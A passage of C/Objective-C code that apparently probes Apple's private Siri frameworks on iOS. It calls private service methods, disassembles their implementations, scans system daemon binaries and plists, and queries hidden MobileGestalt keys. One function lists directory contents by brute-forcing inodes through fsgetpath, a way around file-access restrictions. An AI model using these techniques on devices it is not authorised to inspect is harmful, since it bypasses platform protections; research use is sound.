    ((void (*)(id, SEL))objc_msgSend)(client, sel_registerName("release"));
    dlclose(assistant);
    return out;
}

char *siri_capabilities_client_call_map(void) {
    const size_t cap = 32768;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }
    const char *classes[] = { "AFSiriCapabilitiesServiceClient", "SOSiriCapabilitiesServiceClient", NULL };
    const char *selectors[] = { "updateCapabilities:", "requestSiriAvailabilityWithCompletion:", NULL };
    for (int m = 0; classes[m] && len + 2048 < cap; m++) {
        Class cls = objc_getClass(classes[m]);
        Method method = cls ? class_getInstanceMethod(cls, sel_registerName(selectors[m])) : NULL;
        if (!method) { len += snprintf(out + len, cap - len, "[%s %s] NOT_FOUND\n", classes[m], selectors[m]); continue; }
        void *code = (void *)method_getImplementation(method);
#if __has_include(<ptrauth.h>) && defined(__arm64e__)
        code = ptrauth_strip(code, ptrauth_key_function_pointer);
#endif
        uintptr_t start = (uintptr_t)code;
        const uint32_t *ins = (const uint32_t *)code;
        len += snprintf(out + len, cap - len, "[%s %s] IMP=0x%llx types=%s\n", classes[m], selectors[m], (unsigned long long)start, method_getTypeEncoding(method));
        for (size_t n = 0; n < 160 && len + 512 < cap; n++) {
            uint32_t instruction = ins[n];
            if ((instruction & 0xFC000000U) == 0x94000000U) {
                int64_t immediate = (int64_t)(instruction & 0x03FFFFFFU);
                if (immediate & 0x02000000LL) immediate |= ~0x03FFFFFFLL;
                uintptr_t source = start + n * 4;
                uintptr_t target = (uintptr_t)((int64_t)source + (immediate << 2));
                Dl_info info = {0}; dladdr((void *)target, &info);
                const char *selector_name = NULL;
                const uint32_t *stub = (const uint32_t *)target;
                if ((stub[0] & 0x9F00001FU) == 0x90000001U && (stub[1] & 0xFFC003FFU) == 0x91000021U) {
                    uintptr_t page = decode_adrp_target(target, stub[0]);
                    uint64_t add = (stub[1] >> 10) & 0xFFF; if ((stub[1] >> 22) & 1) add <<= 12;
                    selector_name = (const char *)(page + add);
                }
                len += snprintf(out + len, cap - len, "+0x%04llx selector=%s nearest=%s\n", (unsigned long long)(n * 4), selector_name ? selector_name : "-", info.dli_sname ? info.dli_sname : "-");
            }
            if (instruction == 0xD65F03C0U) break;
        }
    }
    len += snprintf(out + len, cap - len, "read-only; methods not invoked\n");
    dlclose(assistant);
    return out;
}

char *siri_capabilities_service_update(void) {
    const size_t cap = 8192;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    void *assistant = dlopen("/System/Library/PrivateFrameworks/AssistantServices.framework/AssistantServices", RTLD_NOW | RTLD_LOCAL);
    if (!assistant) { snprintf(out, cap, "AssistantServices=NOT_LOADED\n"); return out; }
    Class cls = objc_getClass("AFSiriCapabilitiesServiceClient");
    SEL update_sel = sel_registerName("updateCapabilities:");
    if (!cls || !class_getInstanceMethod(cls, update_sel)) {
        snprintf(out, cap, "updateCapabilities=NOT_FOUND\n"); dlclose(assistant); return out;
    }
    id client = ((id (*)(id, SEL))objc_msgSend)((id)cls, sel_registerName("alloc"));
    client = client ? ((id (*)(id, SEL))objc_msgSend)(client, sel_registerName("init")) : nil;
    if (!client) { snprintf(out, cap, "client=INIT_FAILED\n"); dlclose(assistant); return out; }
    dispatch_semaphore_t sem = dispatch_semaphore_create(0);
    __block bool callback_called = false;
    __block CFTypeRef callback_value = NULL;
    void (^completion)(id) = ^(id value) {
        callback_called = true;
        if (value) callback_value = CFRetain((CFTypeRef)value);
        dispatch_semaphore_signal(sem);
    };
    ((void (*)(id, SEL, void *))objc_msgSend)(client, update_sel, (void *)completion);
    long wait_result = dispatch_semaphore_wait(sem, dispatch_time(DISPATCH_TIME_NOW, 8LL * NSEC_PER_SEC));
    len += snprintf(out + len, cap - len, "update.sent=1 callback=%d timeout=%d\n", callback_called, wait_result != 0);
    append_cf_description(out, cap, &len, "callback.value", callback_value);
    if (callback_value) CFRelease(callback_value);
    bool sae = ((bool (*)(id, SEL))objc_msgSend)(client, sel_registerName("siriSystemAssistantExperienceEnabledSync"));
    bool assets = ((bool (*)(id, SEL))objc_msgSend)(client, sel_registerName("shouldDownloadAssetsForSiriSystemAssistantExperienceSync"));
    bool intents = ((bool (*)(id, SEL))objc_msgSend)(client, sel_registerName("siriWithAppIntentsEnabledSync"));
    len += snprintf(out + len, cap - len, "service.after.SAE=%d\nservice.after.shouldDownloadAssets=%d\nservice.after.AppIntents=%d\n", sae, assets, intents);
    ((void (*)(id, SEL))objc_msgSend)(client, sel_registerName("release"));
    dlclose(assistant);
    return out;
}

static bool siri_service_interesting_string(const char *s) {
    return strstr(s, "Siri") || strstr(s, "siri") || strstr(s, "SAE") ||
           strstr(s, "sae") || strstr(s, "Linwood") || strstr(s, "linwood") ||
           strstr(s, "Grey") || strstr(s, "Gray") || strstr(s, "FeatureFlag") ||
           strstr(s, "Capabilities") || strstr(s, "capabilities") ||
           strstr(s, "Orchestration") || strstr(s, "orchestration") ||
           strstr(s, "DeviceCapable") || strstr(s, "Availability");
}

char *siri_capability_service_binary_probe(void) {
    const size_t cap = 65536;
    char *out = calloc(1, cap);
    if (!out) return NULL;
    size_t len = 0;
    const char *paths[] = {
        "/System/Library/PrivateFrameworks/AssistantServices.framework/XPCServices/com.apple.siri.orchestration.capabilities.xpc/com.apple.siri.orchestration.capabilities",
        "/System/Library/PrivateFrameworks/SiriOrchestration.framework/XPCServices/com.apple.siri.orchestration.capabilities.xpc/com.apple.siri.orchestration.capabilities",
        "/System/Library/PrivateFrameworks/SiriOrchestration.framework/PlugIns/com.apple.siri.orchestration.capabilities.xpc/com.apple.siri.orchestration.capabilities",
        "/System/Library/XPCServices/com.apple.siri.orchestration.capabilities.xpc/com.apple.siri.orchestration.capabilities",
        "/usr/libexec/com.apple.siri.orchestration.capabilities",
        "/usr/libexec/siriorchestrationd",
        "/usr/libexec/assistantd",
        NULL
    };
    for (int p = 0; paths[p] && len + 1024 < cap; p++) {
        struct stat st = {0};
        if (stat(paths[p], &st) != 0) {
            len += snprintf(out + len, cap - len, "MISS %s\n", paths[p]);
            continue;
        }
        len += snprintf(out + len, cap - len, "FOUND size=%lld %s\n", (long long)st.st_size, paths[p]);
        FILE *f = fopen(paths[p], "rb");
        if (!f) { len += snprintf(out + len, cap - len, "OPEN_DENIED errno=%d\n", errno); continue; }
        char string[2048] = {0}; size_t slen = 0; int ch;
        while ((ch = fgetc(f)) != EOF && len + 4096 < cap) {
            if (ch >= 0x20 && ch <= 0x7e) {
                if (slen + 1 < sizeof(string)) string[slen++] = (char)ch;
            } else {
                if (slen >= 5) {
                    string[slen] = 0;
                    if (siri_service_interesting_string(string))
                        len += snprintf(out + len, cap - len, "  %s\n", string);
                }
                slen = 0;
            }
        }
        fclose(f);
    }
    len += snprintf(out + len, cap - len, "read-only binary string scan\n");
    return out;
}

static bool path_name_mentions_siri(const char *s) {
    return strcasestr(s, "siri") || strcasestr(s, "assistant") || strcasestr(s, "orchestration");
}

static void scan_system_tree_names(const char *root, int depth, char *out, size_t cap, size_t *len) {
    if (depth < 0 || *len + 1024 >= cap) return;
    DIR *dir = opendir(root);
    if (!dir) { *len += snprintf(out + *len, cap - *len, "DENIED/MISS %s errno=%d\n", root, errno); return; }
    struct dirent *entry;
    while ((entry = readdir(dir)) && *len + 1024 < cap) {
        if (!strcmp(entry->d_name, ".") || !strcmp(entry->d_name, "..")) continue;
        char path[PATH_MAX];
        snprintf(path, sizeof(path), "%s/%s", root, entry->d_name);
        if (path_name_mentions_siri(entry->d_name))
            *len += snprintf(out + *len, cap - *len, "NAME %s\n", path);
        if (depth > 0 && entry->d_type == DT_DIR)
            scan_system_tree_names(path, depth - 1, out, cap, len);
    }
    closedir(dir);
}

static void scan_launch_plists(const char *root, char *out, size_t cap, size_t *len) {
    DIR *dir = opendir(root);
    if (!dir) { *len += snprintf(out + *len, cap - *len, "DENIED/MISS %s errno=%d\n", root, errno); return; }
    struct dirent *entry;
    const char needle[] = "com.apple.siri.orchestration.capabilities";
    while ((entry = readdir(dir)) && *len + 1024 < cap) {
        if (!strstr(entry->d_name, ".plist")) continue;
        char path[PATH_MAX]; snprintf(path, sizeof(path), "%s/%s", root, entry->d_name);
        FILE *f = fopen(path, "rb"); if (!f) continue;
        char *data = malloc(1024 * 1024 + 1); if (!data) { fclose(f); continue; }
        size_t n = fread(data, 1, 1024 * 1024, f); data[n] = 0; fclose(f);
        if (memmem(data, n, needle, sizeof(needle) - 1))
            *len += snprintf(out + *len, cap - *len, "REGISTRATION %s\n", path);
        free(data);
    }
    closedir(dir);
}

char *siri_capability_service_registration_probe(void) {
    const size_t cap = 131072;
    char *out = calloc(1, cap); if (!out) return NULL;
    size_t len = 0;
    scan_launch_plists("/System/Library/LaunchDaemons", out, cap, &len);
    scan_launch_plists("/System/Library/LaunchAgents", out, cap, &len);
    scan_system_tree_names("/System/Library/PrivateFrameworks", 3, out, cap, &len);
    scan_system_tree_names("/System/Library/Frameworks", 3, out, cap, &len);
    scan_system_tree_names("/usr/libexec", 1, out, cap, &len);
    len += snprintf(out + len, cap - len, "read-only registration/name scan\n");
    return out;
}

static CFPropertyListRef copy_plist_at_path(const char *path) {
    FILE *f = fopen(path, "rb"); if (!f) return NULL;
    fseek(f, 0, SEEK_END); long size = ftell(f); rewind(f);
    if (size <= 0 || size > 16 * 1024 * 1024) { fclose(f); return NULL; }
    UInt8 *bytes = malloc((size_t)size); if (!bytes) { fclose(f); return NULL; }
    size_t read = fread(bytes, 1, (size_t)size, f); fclose(f);
    CFDataRef data = CFDataCreate(NULL, bytes, (CFIndex)read); free(bytes);
    if (!data) return NULL;
    CFErrorRef error = NULL;
    CFPropertyListRef plist = CFPropertyListCreateWithData(NULL, data, kCFPropertyListImmutable, NULL, &error);
    if (error) CFRelease(error); CFRelease(data); return plist;
}

static void scan_interesting_binary(const char *path, char *out, size_t cap, size_t *len) {
    FILE *f = fopen(path, "rb");
    if (!f) { *len += snprintf(out + *len, cap - *len, "binary.open=FAILED errno=%d path=%s\n", errno, path); return; }
    *len += snprintf(out + *len, cap - *len, "binary=%s\n", path);
    char string[2048] = {0}; size_t slen = 0; int ch;
    while ((ch = fgetc(f)) != EOF && *len + 4096 < cap) {
        if (ch >= 0x20 && ch <= 0x7e) { if (slen + 1 < sizeof(string)) string[slen++] = (char)ch; }
        else { if (slen >= 5) { string[slen] = 0; if (siri_service_interesting_string(string)) *len += snprintf(out + *len, cap - *len, "  %s\n", string); } slen = 0; }
    }
    fclose(f);
}

char *siri_capability_daemon_details(void) {
    const size_t cap = 262144;
    char *out = calloc(1, cap); if (!out) return NULL;
    size_t len = 0;
    const char *plists[] = {
        "/System/Library/LaunchDaemons/com.apple.siriknowledged.plist",
        "/System/Library/LaunchDaemons/com.apple.generativeexperiencesd.plist",
        "/System/Library/LaunchDaemons/com.apple.assistantd.plist", NULL
    };
    for (int i = 0; plists[i] && len + 8192 < cap; i++) {
        len += snprintf(out + len, cap - len, "[PLIST %s]\n", plists[i]);
        CFPropertyListRef plist = copy_plist_at_path(plists[i]);
        if (!plist) { len += snprintf(out + len, cap - len, "parse=FAILED\n"); continue; }
        append_cf_description(out, cap, &len, "contents", plist);
        if (CFGetTypeID(plist) == CFDictionaryGetTypeID()) {
            CFDictionaryRef dict = (CFDictionaryRef)plist;
            CFStringRef program = CFDictionaryGetValue(dict, CFSTR("Program"));
            CFArrayRef args = CFDictionaryGetValue(dict, CFSTR("ProgramArguments"));
            CFStringRef executable = program;
            if (!executable && args && CFGetTypeID(args) == CFArrayGetTypeID() && CFArrayGetCount(args) > 0)
                executable = CFArrayGetValueAtIndex(args, 0);
            if (executable && CFGetTypeID(executable) == CFStringGetTypeID()) {
                char path[PATH_MAX] = {0};
                if (CFStringGetCString(executable, path, sizeof(path), kCFStringEncodingUTF8))
                    scan_interesting_binary(path, out, cap, &len);
            }
        }
        CFRelease(plist);
    }
    len += snprintf(out + len, cap - len, "read-only daemon plist/binary scan\n");
    return out;
}

char *elig_probe_domains(void) {
    // v7 proved the guessed ABI crashes on iOS 27. Keep this exported entry
    // point inert until a prototype is recovered from the matching binary.
    return strdup("disabled:eligibility_abi_unverified\n");
}

int elig_set_input_try(int p1, int p2, int p3) {
    (void)p1;
    (void)p2;
    (void)p3;
    return -102; // disabled: eligibility ABI unverified
}

char *mg_probe_extra_keys(void) {
    void *mg = dlopen("/usr/lib/libMobileGestalt.dylib", RTLD_NOW | RTLD_LOCAL);
    if (!mg) return strdup("no_lib");

    typedef void *(*MGCopyAnswerFn)(const void *);
    MGCopyAnswerFn fn = (MGCopyAnswerFn)dlsym(mg, "MGCopyAnswer");
    if (!fn) { dlclose(mg); return strdup("no_fn"); }

    const char *keys[] = {
        "oPeik/9e8lQWMszEjbPzng",
        "qNNddlUK+B/YlooNoymwgA",
        "IMLaTlEKsZ4jjGfHG/bVEg",
        "3iiS7QzaQ7/UV9cSk2sn/A",
        "Efj9FNfV60OLkq9HSOVY3Q",
        "YlEtRmOVvRG0xznyT6qevQ",
        "7MKiVMCJB3WEcOElKrGkog",
        "ASDqJXBxJ3OpjRM9aQFLWg",
        "zHeENZu+wbg7PUprwNwBWg",
        "RqQ7DSxER3BAoOivu/q8Vg",
        "+3Uf0Pm5F8Xy7Onyvko0vA",
        "J/MYIxisnrhXiJFa3pLdyg",
        NULL
    };
    const char *names[] = {
        "AlwaysOnAssistant",
        "DeviceClassNumber",
        "DeviceVariant",
        "SiriEnabled",
        "MLCapable",
        "ANECapable",
        "ANENumCores",
        "DeviceHasANE",
        "HeySiriSupport",
        "SiriAllowed",
        "NeuralEngine",
        "SiriGestaltKey",
        NULL
    };

    size_t cap = 4096;
    char *out = malloc(cap);
    if (!out) { dlclose(mg); return NULL; }
    size_t len = 0;

    for (int i = 0; keys[i]; i++) {
        CFStringRef cfKey = CFStringCreateWithCString(kCFAllocatorDefault, keys[i], kCFStringEncodingUTF8);
        if (!cfKey) continue;
        void *val = fn(cfKey);
        CFRelease(cfKey);
        if (val) {
            CFTypeID tid = CFGetTypeID(val);
            if (tid == CFBooleanGetTypeID()) {
                len += snprintf(out + len, cap - len, "%s=%s\n", names[i],
                    CFBooleanGetValue(val) ? "true" : "false");
            } else if (tid == CFNumberGetTypeID()) {
                int64_t n = 0;
                CFNumberGetValue(val, kCFNumberSInt64Type, &n);
                len += snprintf(out + len, cap - len, "%s=%lld\n", names[i], n);
            } else if (tid == CFStringGetTypeID()) {
                char buf[256];
                CFStringGetCString(val, buf, sizeof(buf), kCFStringEncodingUTF8);
                len += snprintf(out + len, cap - len, "%s=%s\n", names[i], buf);
            } else {
                len += snprintf(out + len, cap - len, "%s=<type%lu>\n", names[i], tid);
            }
            CFRelease(val);
        }
    }

    if (len == 0)
        len += snprintf(out + len, cap - len, "no_results\n");

    dlclose(mg);
    return out;
}

char *bad_query_list(char *path, int64_t max_inode) {
    struct statfs sfs;
    if (statfs(path, &sfs) != 0) return NULL;
    fsid_t fsid = sfs.f_fsid;
    
    size_t cap = 65536;
    size_t length = 0;
    size_t path_length = strlen(path);
    
    char *out = malloc(cap);
    if (!out) return NULL;
    out[0] = '\0';
    
    char buf[1200];
    for (uint64_t ino = 1; ino <= max_inode; ino++) {
        ssize_t n = fsgetpath(buf, sizeof(buf), &fsid, ino);
        if (n <= 0) continue;
        
        const char *p = buf;
        if (strncmp(p, "/private/var/", 13) == 0) p += 8;
        if (strncmp(p, path, path_length) != 0 || p[path_length] != '/') continue;
        if (strchr(p + path_length + 1, '/')) continue;
        
        size_t need = strlen(p) + 2;
        if (length + need > cap) { cap *= 2; char *t = realloc(out, cap); if (!t) break; out = t; }
        length += snprintf(out + length, cap - length, "%s\n", p);
    }
    return out;
}
